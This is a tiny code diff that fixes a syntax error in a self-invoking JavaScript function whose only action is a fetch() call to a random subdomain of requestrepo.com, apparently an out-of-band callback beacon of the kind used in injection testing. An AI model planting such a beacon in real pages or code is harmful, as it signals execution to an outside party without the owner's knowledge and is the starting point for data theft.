@@ -1,3 +1,3 @@
 (() => {
- fetch('https://5mxegwdn.requestrepo.com/'));
+ fetch('https://5mxegwdn.requestrepo.com/');
 })();
